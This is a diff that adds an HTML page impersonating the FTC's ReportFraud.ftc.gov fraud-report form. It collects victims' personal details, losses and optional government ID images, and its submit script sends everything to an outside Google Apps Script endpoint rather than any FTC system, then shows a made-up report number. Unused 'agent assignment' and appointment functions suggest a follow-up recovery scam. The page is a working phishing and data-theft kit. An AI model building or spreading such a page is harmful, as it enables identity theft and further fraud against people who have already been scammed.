@@ -1,0 +1,739 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File a Report - ReportFraud.ftc.gov</title>
+    <link rel="stylesheet" href="ftc-styles.css">
+</head>
+<body>
+    <!-- USA Banner -->
+    <div class="usa-banner">
+        <div class="usa-banner-inner">
+            <span>An official website of the United States government</span>
+            <div class="usa-banner-links">
+                <a href="#">Español</a>
+                <a href="https://www.ftc.gov">FTC.gov</a>
+                <a href="#">Contact</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- FTC Header -->
+    <header class="ftc-header">
+        <div class="ftc-header-inner">
+            <div class="ftc-logo">
+                <svg class="ftc-seal" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="50" cy="50" r="45" fill="#003366" stroke="#fff" stroke-width="3"/>
+                    <text x="50" y="45" text-anchor="middle" fill="#fff" font-size="12" font-weight="bold">FTC</text>
+                    <text x="50" y="60" text-anchor="middle" fill="#fff" font-size="8">FEDERAL TRADE</text>
+                    <text x="50" y="72" text-anchor="middle" fill="#fff" font-size="8">COMMISSION</text>
+                </svg>
+                <div class="ftc-branding">
+                    <h1>Federal Trade Commission</h1>
+                    <p>ReportFraud.ftc.gov</p>
+                </div>
+            </div>
+            <nav class="ftc-nav">
+                <a href="index.html">Home</a>
+                <a href="report.html">File a Report</a>
+                <a href="#">Track Report</a>
+                <a href="#">FAQs</a>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Report Form Container -->
+    <div class="report-container">
+        <!-- Progress Bar -->
+        <div class="progress-bar">
+            <div class="progress-step active" data-step="1">
+                <div class="progress-step-number">1</div>
+                <div class="progress-step-label">What Happened</div>
+            </div>
+            <div class="progress-step" data-step="2">
+                <div class="progress-step-number">2</div>
+                <div class="progress-step-label">The Scammer</div>
+            </div>
+            <div class="progress-step" data-step="3">
+                <div class="progress-step-number">3</div>
+                <div class="progress-step-label">Your Details</div>
+            </div>
+            <div class="progress-step" data-step="4">
+                <div class="progress-step-number">4</div>
+                <div class="progress-step-label">Review</div>
+            </div>
+        </div>
+
+        <!-- Step 1: What Happened -->
+        <div class="form-step active" id="step1">
+            <div class="form-card">
+                <h2>What Happened?</h2>
+                
+                <div class="form-group">
+                    <label>Category of Fraud *</label>
+                    <div class="wizard-categories">
+                        <div class="wizard-category" data-value="impersonator">
+                            <h4>Impersonator</h4>
+                            <p>Government or business</p>
+                        </div>
+                        <div class="wizard-category" data-value="online-shopping">
+                            <h4>Online Shopping</h4>
+                            <p>Negative reviews or scams</p>
+                        </div>
+                        <div class="wizard-category" data-value="investment">
+                            <h4>Investment</h4>
+                            <p>Business opportunity</p>
+                        </div>
+                        <div class="wizard-category" data-value="phone">
+                            <h4>Phone</h4>
+                            <p>Telephone or mobile</p>
+                        </div>
+                        <div class="wizard-category" data-value="prizes">
+                            <h4>Prizes</h4>
+                            <p>Sweepstakes & lotteries</p>
+                        </div>
+                        <div class="wizard-category" data-value="identity">
+                            <h4>Identity</h4>
+                            <p>Identity theft</p>
+                        </div>
+                        <div class="wizard-category" data-value="debt">
+                            <h4>Debt</h4>
+                            <p>Debt relief or collection</p>
+                        </div>
+                        <div class="wizard-category" data-value="other">
+                            <h4>Other</h4>
+                            <p>Something else</p>
+                        </div>
+                    </div>
+                    <input type="hidden" id="category" name="category">
+                    <div class="error">Please select a category</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="story">Tell us what happened *</label>
+                    <textarea id="story" name="story" placeholder="Please describe what happened in detail..."></textarea>
+                    <div class="error">Please describe what happened</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="date">When did this occur? *</label>
+                    <input type="date" id="date" name="date">
+                    <div class="error">Please provide the date</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="moneyLost">Did you lose money?</label>
+                    <select id="moneyLost" name="moneyLost">
+                        <option value="">Select an option</option>
+                        <option value="yes">Yes</option>
+                        <option value="no">No</option>
+                        <option value="unsure">Unsure</option>
+                    </select>
+                </div>
+
+                <div class="form-group" id="amountGroup" style="display: none;">
+                    <label for="amountLost">How much did you lose?</label>
+                    <input type="number" id="amountLost" name="amountLost" placeholder="Enter amount in USD">
+                    <div class="hint">Enter the total amount lost</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="paymentMethod">How did you pay?</label>
+                    <select id="paymentMethod" name="paymentMethod">
+                        <option value="">Select payment method</option>
+                        <option value="credit-card">Credit Card</option>
+                        <option value="bank-transfer">Bank Transfer</option>
+                        <option value="crypto">Cryptocurrency</option>
+                        <option value="gift-card">Gift Card</option>
+                        <option value="cash">Cash</option>
+                        <option value="zelle">Zelle</option>
+                        <option value="other">Other</option>
+                        <option value="none">None / Didn't pay</option>
+                    </select>
+                </div>
+
+                <div class="form-actions">
+                    <button type="button" class="btn-secondary" id="back1" disabled>Back</button>
+                    <button type="button" class="btn-primary" id="continue1">Continue</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 2: The Scammer -->
+        <div class="form-step" id="step2">
+            <div class="form-card">
+                <h2>The Scammer</h2>
+                
+                <div class="form-group">
+                    <label for="scammerName">Name of Person or Business</label>
+                    <input type="text" id="scammerName" name="scammerName" placeholder="If known">
+                </div>
+
+                <div class="form-group">
+                    <label for="scammerPhone">Phone Number</label>
+                    <input type="tel" id="scammerPhone" name="scammerPhone" placeholder="10-digit phone number" maxlength="10">
+                    <div class="hint">10 digits only, no dashes or spaces</div>
+                    <div class="error">Please enter a valid 10-digit phone number</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="scammerEmail">Email Address</label>
+                    <input type="email" id="scammerEmail" name="scammerEmail" placeholder="scammer@example.com">
+                </div>
+
+                <div class="form-group">
+                    <label for="scammerWebsite">Website</label>
+                    <input type="url" id="scammerWebsite" name="scammerWebsite" placeholder="https://example.com">
+                </div>
+
+                <div class="form-group">
+                    <label for="contactMethod">How were you contacted? *</label>
+                    <select id="contactMethod" name="contactMethod">
+                        <option value="">Select method</option>
+                        <option value="phone-call">Phone Call</option>
+                        <option value="text-message">Text Message</option>
+                        <option value="email">Email</option>
+                        <option value="social-media">Social Media</option>
+                        <option value="website">Website</option>
+                        <option value="mail">Mail</option>
+                        <option value="in-person">In Person</option>
+                        <option value="other">Other</option>
+                    </select>
+                    <div class="error">Please select how you were contacted</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="pretending">Was the scammer pretending to be someone?</label>
+                    <select id="pretending" name="pretending">
+                        <option value="">Select option</option>
+                        <option value="irs">IRS</option>
+                        <option value="ssa">Social Security Administration</option>
+                        <option value="ftc">FTC</option>
+                        <option value="tech-support">Tech Support</option>
+                        <option value="bank">Bank</option>
+                        <option value="amazon">Amazon</option>
+                        <option value="lottery">Lottery/Sweepstakes</option>
+                        <option value="none">No</option>
+                        <option value="other">Other</option>
+                    </select>
+                </div>
+
+                <div class="form-actions">
+                    <button type="button" class="btn-secondary" id="back2">Back</button>
+                    <button type="button" class="btn-primary" id="continue2">Continue</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 3: Your Details -->
+        <div class="form-step" id="step3">
+            <div class="form-card">
+                <h2>Your Details</h2>
+                
+                <div class="form-group">
+                    <label for="firstName">First Name *</label>
+                    <input type="text" id="firstName" name="firstName" required>
+                    <div class="error">First name is required</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="lastName">Last Name *</label>
+                    <input type="text" id="lastName" name="lastName" required>
+                    <div class="error">Last name is required</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="email">Email Address *</label>
+                    <input type="email" id="email" name="email" required>
+                    <div class="error">Please enter a valid email address</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="phone">Phone Number</label>
+                    <input type="tel" id="phone" name="phone" placeholder="10-digit phone number" maxlength="10">
+                    <div class="hint">10 digits only</div>
+                    <div class="error">Please enter a valid 10-digit phone number</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="address">Street Address</label>
+                    <input type="text" id="address" name="address" placeholder="123 Main Street">
+                </div>
+
+                <div class="form-group">
+                    <label for="city">City</label>
+                    <input type="text" id="city" name="city">
+                </div>
+
+                <div class="form-group">
+                    <label for="state">State</label>
+                    <select id="state" name="state">
+                        <option value="">Select state</option>
+                        <option value="AL">Alabama</option>
+                        <option value="AK">Alaska</option>
+                        <option value="AZ">Arizona</option>
+                        <option value="AR">Arkansas</option>
+                        <option value="CA">California</option>
+                        <option value="CO">Colorado</option>
+                        <option value="CT">Connecticut</option>
+                        <option value="DE">Delaware</option>
+                        <option value="FL">Florida</option>
+                        <option value="GA">Georgia</option>
+                        <option value="HI">Hawaii</option>
+                        <option value="ID">Idaho</option>
+                        <option value="IL">Illinois</option>
+                        <option value="IN">Indiana</option>
+                        <option value="IA">Iowa</option>
+                        <option value="KS">Kansas</option>
+                        <option value="KY">Kentucky</option>
+                        <option value="LA">Louisiana</option>
+                        <option value="ME">Maine</option>
+                        <option value="MD">Maryland</option>
+                        <option value="MA">Massachusetts</option>
+                        <option value="MI">Michigan</option>
+                        <option value="MN">Minnesota</option>
+                        <option value="MS">Mississippi</option>
+                        <option value="MO">Missouri</option>
+                        <option value="MT">Montana</option>
+                        <option value="NE">Nebraska</option>
+                        <option value="NV">Nevada</option>
+                        <option value="NH">New Hampshire</option>
+                        <option value="NJ">New Jersey</option>
+                        <option value="NM">New Mexico</option>
+                        <option value="NY">New York</option>
+                        <option value="NC">North Carolina</option>
+                        <option value="ND">North Dakota</option>
+                        <option value="OH">Ohio</option>
+                        <option value="OK">Oklahoma</option>
+                        <option value="OR">Oregon</option>
+                        <option value="PA">Pennsylvania</option>
+                        <option value="RI">Rhode Island</option>
+                        <option value="SC">South Carolina</option>
+                        <option value="SD">South Dakota</option>
+                        <option value="TN">Tennessee</option>
+                        <option value="TX">Texas</option>
+                        <option value="UT">Utah</option>
+                        <option value="VT">Vermont</option>
+                        <option value="VA">Virginia</option>
+                        <option value="WA">Washington</option>
+                        <option value="WV">West Virginia</option>
+                        <option value="WI">Wisconsin</option>
+                        <option value="WY">Wyoming</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label for="zip">ZIP Code</label>
+                    <input type="text" id="zip" name="zip" placeholder="12345" maxlength="5">
+                </div>
+
+                <div class="form-group">
+                    <label>
+                        <input type="checkbox" id="privacyAgree" name="privacyAgree">
+                        I understand my information will be used to help fight fraud
+                    </label>
+                </div>
+
+                <!-- Optional ID Upload -->
+                <div class="id-upload">
+                    <h4>Optional: Upload Government ID</h4>
+                    <p class="hint">Max file size: 5MB</p>
+                    
+                    <div class="upload-box" onclick="document.getElementById('idFront').click()">
+                        <p>Click to upload ID Front</p>
+                        <input type="file" id="idFront" name="idFront" accept="image/*">
+                        <img id="idFrontPreview" class="upload-preview" alt="ID Front Preview">
+                    </div>
+
+                    <div class="upload-box" onclick="document.getElementById('idBack').click()">
+                        <p>Click to upload ID Back</p>
+                        <input type="file" id="idBack" name="idBack" accept="image/*">
+                        <img id="idBackPreview" class="upload-preview" alt="ID Back Preview">
+                    </div>
+                </div>
+
+                <div class="form-actions">
+                    <button type="button" class="btn-secondary" id="back3">Back</button>
+                    <button type="button" class="btn-primary" id="continue3">Continue</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 4: Review -->
+        <div class="form-step" id="step4">
+            <div class="form-card">
+                <h2>Review Your Report</h2>
+                
+                <table class="review-table">
+                    <tr>
+                        <th>Category</th>
+                        <td id="reviewCategory">-</td>
+                    </tr>
+                    <tr>
+                        <th>Date</th>
+                        <td id="reviewDate">-</td>
+                    </tr>
+                    <tr>
+                        <th>Money Lost</th>
+                        <td id="reviewMoneyLost">-</td>
+                    </tr>
+                    <tr>
+                        <th>Payment Method</th>
+                        <td id="reviewPaymentMethod">-</td>
+                    </tr>
+                    <tr>
+                        <th>How Contacted</th>
+                        <td id="reviewContactMethod">-</td>
+                    </tr>
+                    <tr>
+                        <th>Scammer Name</th>
+                        <td id="reviewScammerName">-</td>
+                    </tr>
+                    <tr>
+                        <th>Scammer Website</th>
+                        <td id="reviewScammerWebsite">-</td>
+                    </tr>
+                    <tr>
+                        <th>Your Name</th>
+                        <td id="reviewYourName">-</td>
+                    </tr>
+                    <tr>
+                        <th>Your Email</th>
+                        <td id="reviewYourEmail">-</td>
+                    </tr>
+                    <tr>
+                        <th>Location</th>
+                        <td id="reviewLocation">-</td>
+                    </tr>
+                </table>
+
+                <div class="review-story">
+                    <h4>Your Story</h4>
+                    <p id="reviewStory">-</p>
+                </div>
+
+                <div class="declaration-box">
+                    <label>
+                        <input type="checkbox" id="declaration" name="declaration">
+                        I declare that the information provided is true and accurate to the best of my knowledge.
+                    </label>
+                </div>
+
+                <div class="form-actions">
+                    <button type="button" class="btn-secondary" id="back4">Back</button>
+                    <button type="button" class="btn-primary" id="submitReport">Submit Report</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal for Time Selection -->
+    <div class="modal-overlay" id="timeModal">
+        <div class="modal-box">
+            <h3>Select Appointment Time</h3>
+            <div class="form-group">
+                <label for="appointmentDate">Date</label>
+                <input type="date" id="appointmentDate">
+            </div>
+            <div class="form-group">
+                <label for="appointmentTime">Time</label>
+                <select id="appointmentTime">
+                    <option value="09:00">9:00 AM</option>
+                    <option value="10:00">10:00 AM</option>
+                    <option value="11:00">11:00 AM</option>
+                    <option value="12:00">12:00 PM</option>
+                    <option value="13:00">1:00 PM</option>
+                    <option value="14:00">2:00 PM</option>
+                    <option value="15:00">3:00 PM</option>
+                    <option value="16:00">4:00 PM</option>
+                </select>
+            </div>
+            <div class="modal-actions">
+                <button type="button" class="btn-secondary" id="cancelTime">Cancel</button>
+                <button type="button" class="btn-primary" id="confirmTime">Confirm</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Form Data
+        let formData = {
+            category: '',
+            story: '',
+            date: '',
+            moneyLost: '',
+            amountLost: '',
+            paymentMethod: '',
+            scammerName: '',
+            scammerPhone: '',
+            scammerEmail: '',
+            scammerWebsite: '',
+            contactMethod: '',
+            pretending: '',
+            firstName: '',
+            lastName: '',
+            email: '',
+            phone: '',
+            address: '',
+            city: '',
+            state: '',
+            zip: '',
+            idFrontBase64: '',
+            idBackBase64: '',
+            idFrontUploaded: '',
+            idBackUploaded: ''
+        };
+
+        let currentStep = 1;
+        let selectedAgent = null;
+
+        // Category Selection
+        document.querySelectorAll('.wizard-category').forEach(tile => {
+            tile.addEventListener('click', function() {
+                document.querySelectorAll('.wizard-category').forEach(t => t.classList.remove('selected'));
+                this.classList.add('selected');
+                document.getElementById('category').value = this.dataset.value;
+                formData.category = this.dataset.value;
+            });
+        });
+
+        // Money Lost Toggle
+        document.getElementById('moneyLost').addEventListener('change', function() {
+            document.getElementById('amountGroup').style.display = this.value === 'yes' ? 'block' : 'none';
+        });
+
+        // ID Upload Preview
+        document.getElementById('idFront').addEventListener('change', function(e) {
+            handleFileUpload(e.target, 'idFrontPreview', 'idFrontBase64', 'idFrontUploaded');
+        });
+
+        document.getElementById('idBack').addEventListener('change', function(e) {
+            handleFileUpload(e.target, 'idBackPreview', 'idBackBase64', 'idBackUploaded');
+        });
+
+        function handleFileUpload(input, previewId, base64Key, filenameKey) {
+            const file = input.files[0];
+            if (file) {
+                if (file.size > 5 * 1024 * 1024) {
+                    alert('File size must be less than 5MB');
+                    input.value = '';
+                    return;
+                }
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    document.getElementById(previewId).src = e.target.result;
+                    document.getElementById(previewId).classList.add('show');
+                    formData[base64Key] = e.target.result;
+                    formData[filenameKey] = file.name;
+                };
+                reader.readAsDataURL(file);
+            }
+        }
+
+        // Navigation
+        document.getElementById('continue1').addEventListener('click', () => validateAndProceed(1, 2));
+        document.getElementById('continue2').addEventListener('click', () => validateAndProceed(2, 3));
+        document.getElementById('continue3').addEventListener('click', () => validateAndProceed(3, 4));
+        document.getElementById('back2').addEventListener('click', () => goToStep(2, 1));
+        document.getElementById('back3').addEventListener('click', () => goToStep(3, 2));
+        document.getElementById('back4').addEventListener('click', () => goToStep(4, 3));
+
+        function validateAndProceed(from, to) {
+            if (validateStep(from)) {
+                collectFormData();
+                if (to === 4) {
+                    populateReview();
+                }
+                goToStep(from, to);
+            }
+        }
+
+        function validateStep(step) {
+            let valid = true;
+
+            if (step === 1) {
+                if (!formData.category) {
+                    valid = false;
+                    document.querySelector('[name="category"]').closest('.form-group').classList.add('error');
+                }
+                if (!document.getElementById('story').value.trim()) {
+                    valid = false;
+                    document.getElementById('story').closest('.form-group').classList.add('error');
+                }
+                if (!document.getElementById('date').value) {
+                    valid = false;
+                    document.getElementById('date').closest('.form-group').classList.add('error');
+                }
+            }
+
+            if (step === 2) {
+                if (!document.getElementById('contactMethod').value) {
+                    valid = false;
+                    document.getElementById('contactMethod').closest('.form-group').classList.add('error');
+                }
+                const phone = document.getElementById('scammerPhone').value;
+                if (phone && !/^\d{10}$/.test(phone)) {
+                    valid = false;
+                    document.getElementById('scammerPhone').closest('.form-group').classList.add('error');
+                }
+            }
+
+            if (step === 3) {
+                if (!document.getElementById('firstName').value.trim()) {
+                    valid = false;
+                    document.getElementById('firstName').closest('.form-group').classList.add('error');
+                }
+                if (!document.getElementById('lastName').value.trim()) {
+                    valid = false;
+                    document.getElementById('lastName').closest('.form-group').classList.add('error');
+                }
+                const email = document.getElementById('email').value;
+                if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                    valid = false;
+                    document.getElementById('email').closest('.form-group').classList.add('error');
+                }
+                const phone = document.getElementById('phone').value;
+                if (phone && !/^\d{10}$/.test(phone)) {
+                    valid = false;
+                    document.getElementById('phone').closest('.form-group').classList.add('error');
+                }
+            }
+
+            return valid;
+        }
+
+        function collectFormData() {
+            formData.story = document.getElementById('story').value;
+            formData.date = document.getElementById('date').value;
+            formData.moneyLost = document.getElementById('moneyLost').value;
+            formData.amountLost = document.getElementById('amountLost').value;
+            formData.paymentMethod = document.getElementById('paymentMethod').value;
+            formData.scammerName = document.getElementById('scammerName').value;
+            formData.scammerPhone = document.getElementById('scammerPhone').value;
+            formData.scammerEmail = document.getElementById('scammerEmail').value;
+            formData.scammerWebsite = document.getElementById('scammerWebsite').value;
+            formData.contactMethod = document.getElementById('contactMethod').value;
+            formData.pretending = document.getElementById('pretending').value;
+            formData.firstName = document.getElementById('firstName').value;
+            formData.lastName = document.getElementById('lastName').value;
+            formData.email = document.getElementById('email').value;
+            formData.phone = document.getElementById('phone').value;
+            formData.address = document.getElementById('address').value;
+            formData.city = document.getElementById('city').value;
+            formData.state = document.getElementById('state').value;
+            formData.zip = document.getElementById('zip').value;
+        }
+
+        function goToStep(from, to) {
+            document.getElementById(`step${from}`).classList.remove('active');
+            document.getElementById(`step${to}`).classList.add('active');
+            
+            document.querySelectorAll('.progress-step').forEach(step => {
+                step.classList.remove('active', 'done');
+            });
+            
+            for (let i = 1; i <= to; i++) {
+                const stepEl = document.querySelector(`.progress-step[data-step="${i}"]`);
+                if (i < to) {
+                    stepEl.classList.add('done');
+                } else {
+                    stepEl.classList.add('active');
+                }
+            }
+            
+            currentStep = to;
+        }
+
+        function populateReview() {
+            document.getElementById('reviewCategory').textContent = formData.category || '-';
+            document.getElementById('reviewDate').textContent = formData.date || '-';
+            document.getElementById('reviewMoneyLost').textContent = formData.moneyLost === 'yes' ? `$${formData.amountLost}` : formData.moneyLost || '-';
+            document.getElementById('reviewPaymentMethod').textContent = formData.paymentMethod || '-';
+            document.getElementById('reviewContactMethod').textContent = formData.contactMethod || '-';
+            document.getElementById('reviewScammerName').textContent = formData.scammerName || '-';
+            document.getElementById('reviewScammerWebsite').textContent = formData.scammerWebsite || '-';
+            document.getElementById('reviewYourName').textContent = `${formData.firstName} ${formData.lastName}` || '-';
+            document.getElementById('reviewYourEmail').textContent = formData.email || '-';
+            document.getElementById('reviewLocation').textContent = `${formData.city}, ${formData.state} ${formData.zip}`.trim() || '-';
+            document.getElementById('reviewStory').textContent = formData.story || '-';
+        }
+
+        // Submit Report
+        document.getElementById('submitReport').addEventListener('click', function() {
+            if (!document.getElementById('declaration').checked) {
+                alert('Please accept the declaration to submit your report.');
+                return;
+            }
+
+            // Generate report number
+            const reportNumber = `FTC-${new Date().getFullYear()}-${Math.random().toString(36).substr(2, 6).toUpperCase()}`;
+            formData.reportNumber = reportNumber;
+
+            // Save to localStorage
+            localStorage.setItem('ftcReport', JSON.stringify(formData));
+
+            // Send to Google Apps Script
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbxQxaneGvFr9ToqToKCGiigzT3S_GA6JgrNaken1LaqqlCkqIRdWLwdSeUz3JC87zvv/exec';
+            
+            fetch(scriptURL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    type: 'ftc_report',
+                    ...formData
+                })
+            })
+            .then(() => {
+                setTimeout(() => {
+                    window.location.href = `confirmation.html?reportNumber=${reportNumber}`;
+                }, 1800);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                // Still redirect even if fetch fails
+                setTimeout(() => {
+                    window.location.href = `confirmation.html?reportNumber=${reportNumber}`;
+                }, 1800);
+            });
+        });
+
+        // Modal Functions
+        function openTimeModal(name, email) {
+            selectedAgent = { name, email };
+            document.getElementById('timeModal').classList.add('show');
+        }
+
+        function closeTimeModal() {
+            document.getElementById('timeModal').classList.remove('show');
+            selectedAgent = null;
+        }
+
+        document.getElementById('cancelTime').addEventListener('click', closeTimeModal);
+
+        document.getElementById('confirmTime').addEventListener('click', function() {
+            const date = document.getElementById('appointmentDate').value;
+            const time = document.getElementById('appointmentTime').value;
+            
+            if (!date) {
+                alert('Please select a date');
+                return;
+            }
+            
+            alert(`Appointment scheduled for ${date} at ${time} with ${selectedAgent.name}`);
+            closeTimeModal();
+        });
+
+        function scheduleAppointment(name, email) {
+            alert(`Scheduling appointment with ${name} (${email})`);
+        }
+
+        function agreeAndAssign(name, email) {
+            alert(`Agent ${name} has been assigned to your case!`);
+        }
+    </script>
+</body>
+</html>
